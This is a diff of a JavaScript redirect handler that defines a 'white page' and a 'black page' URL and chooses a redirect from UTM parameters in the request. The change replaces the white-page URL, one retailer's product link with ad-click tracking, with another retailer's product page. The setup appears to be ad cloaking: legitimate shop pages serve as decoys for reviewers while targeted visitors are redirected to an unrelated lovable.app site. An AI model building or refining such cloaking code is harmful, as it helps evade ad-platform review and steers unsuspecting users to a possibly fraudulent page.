@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://pricedumb.com.au/products/10-pack-20cm-short-data-charger-charging-usb-type-c-phone-tablet-cable-cord-bulk?gad_source=1&gad_campaignid=22442662489&gbraid=0AAAAAoK_Z8fdpUrgyzlWkYROuy7OabDbH&gclid=CjwKCAiAoNbIBhB5EiwAZFbYGJ1NzBbGKl-xnP07_3KrT0FEtwLUqkItNTUnQ4z-pXbaIcvGcE13ZxoCnSoQAvD_BwE";
+    const whitePageURL = "https://www.marquise.com.au/products/by-the-sea-short-sleeve-romper";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
